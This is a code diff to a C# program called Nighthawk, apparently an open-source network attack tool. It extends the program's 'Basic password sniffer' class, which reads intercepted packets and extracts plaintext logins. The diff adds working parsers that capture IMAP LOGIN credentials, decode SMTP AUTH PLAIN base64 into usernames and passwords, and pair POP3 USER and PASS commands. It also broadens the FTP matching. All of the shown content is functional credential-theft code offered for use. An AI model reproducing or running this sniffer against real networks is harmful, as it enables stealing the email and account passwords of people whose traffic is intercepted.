@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Net;
+using System.Text.RegularExpressions;
 using PacketDotNet;
 using System.Threading;
 
@@ -25,7 +26,7 @@ along with this program.  If not, see <http://www.gnu.org/licenses/>.
 **/
 namespace Nighthawk
 {
-    /* Basic password sniffer (currently only HTTP, HTML forms and FTP) */
+    /* Basic password sniffer */
     public class Sniffer
     {
         public bool Started;
@@ -44,8 +45,9 @@ namespace Nighthawk
         // collection of POST requests (hostname/url tracking for incomplete packets)
         private List<SnifferPostRequest> postRequests;
 
-        // collection of FTP logins
+        // collections of partial logins
         private List<SnifferFTPlogin> ftpLogins;
+        private List<SnifferPOP3login> pop3Logins;
 
         // events
         public event SnifferResultHandler SnifferResult;
@@ -113,6 +115,7 @@ namespace Nighthawk
 
             postRequests = new List<SnifferPostRequest>();
             ftpLogins = new List<SnifferFTPlogin>();
+            pop3Logins = new List<SnifferPOP3login>();
 
             // start a worker thread
             worker = new Thread(new ThreadStart(Worker));
@@ -177,14 +180,14 @@ namespace Nighthawk
                                 var login = logins.Last();
 
                                 // get user
-                                if (data.Length > 4 && data.Substring(0, 4) == "USER")
+                                if (data.Length > 4 && data.Substring(0, 4).ToUpper() == "USER")
                                 {
                                     var parts = data.Split(' ');
                                     if(parts.Length > 1) login.User = parts[1].Replace("\r\n", "");
                                 }
 
                                 // get password
-                                if (data.Length > 4 && data.Substring(0, 4) == "PASS")
+                                if (data.Length > 4 && data.Substring(0, 4).ToUpper() == "PASS")
                                 {
                                     var parts = data.Split(' ');
                                     if (parts.Length > 1) login.Password = parts[1].Replace("\r\n", "");
@@ -197,6 +200,83 @@ namespace Nighthawk
                             else
                             {
                                 ftpLogins.Add(new SnifferFTPlogin { DestinationAddress = destIP, SourceAddress = sourceIP });
+                            }
+
+                            continue;
+                        }
+
+                        // check for IMAP
+                        if (packet.DestinationPort == 143)
+                        {
+                            // parse TCP packet data
+                            var data = packet.PayloadData != null ? encoding.GetString(packet.PayloadData) : "";
+
+                            // TAG LOGIN "username" "password"
+                            var regexIMAP = new Regex("(.*?) login \"(.*?)\" \"(.*?)\"");
+                            var matches = SimpleRegex.GetMatches(regexIMAP, data);
+
+                            if (matches.Count > 0)
+                            {
+                                Result(sourceIP.ToString(), matches[2], matches[3], "/", SnifferResultType.IMAP);
+                            }
+
+                            continue;
+                        }
+
+                        // check for SMTP
+                        if (packet.DestinationPort == 25)
+                        {
+                            // parse TCP packet data
+                            var data = packet.PayloadData != null ? encoding.GetString(packet.PayloadData) : "";
+
+                            // AUTH PLAIN base64
+                            var regexSMTP = new Regex("AUTH PLAIN (.*?)$");
+                            var matches = SimpleRegex.GetMatches(regexSMTP, data);
+
+                            if (matches.Count > 0)
+                            {
+                                var credentials = encoding.GetString(Convert.FromBase64String(matches[1].Replace("\r", ""))).Split(Convert.ToChar(0x0));
+
+                                if (credentials.Length > 2) Result(sourceIP.ToString(), credentials[1], credentials[2], "/", SnifferResultType.SMTP);
+                            }
+
+                            continue;
+                        }
+
+                        // check for POP3
+                        if (packet.DestinationPort == 110)
+                        {
+                            var logins = pop3Logins.Where(l => (l.DestinationAddress.ToString() == destIP.ToString() && l.SourceAddress.ToString() == sourceIP.ToString()));
+
+                            // parse TCP packet data
+                            var data = packet.PayloadData != null ? encoding.GetString(packet.PayloadData) : "";
+
+                            // check if connection already started
+                            if (logins.Count() > 0)
+                            {
+                                var login = logins.Last();
+
+                                // get user
+                                if (data.Length > 4 && data.Substring(0, 4).ToUpper() == "USER")
+                                {
+                                    var parts = data.Split(' ');
+                                    if (parts.Length > 1) login.User = parts[1].Replace("\r\n", "");
+                                }
+
+                                // get password
+                                if (data.Length > 4 && data.Substring(0, 4).ToUpper() == "PASS")
+                                {
+                                    var parts = data.Split(' ');
+                                    if (parts.Length > 1) login.Password = parts[1].Replace("\r\n", "");
+
+                                    Result(login.DestinationAddress.ToString(), login.User, login.Password, "/", SnifferResultType.POP3);
+
+                                    pop3Logins.Remove(login);
+                                }
+                            }
+                            else
+                            {
+                                pop3Logins.Add(new SnifferPOP3login { DestinationAddress = destIP, SourceAddress = sourceIP });
                             }
 
                             continue;
@@ -331,7 +411,10 @@ namespace Nighthawk
     {
         HTTPAuth,
         HTML,
-        FTP
+        FTP,
+        IMAP,
+        POP3,
+        SMTP
     }
 
     public class SnifferPostRequest
@@ -343,6 +426,14 @@ namespace Nighthawk
     }
 
     public class SnifferFTPlogin
+    {
+        public IPAddress SourceAddress;
+        public IPAddress DestinationAddress;
+        public string User;
+        public string Password;
+    }
+
+    public class SnifferPOP3login
     {
         public IPAddress SourceAddress;
         public IPAddress DestinationAddress;
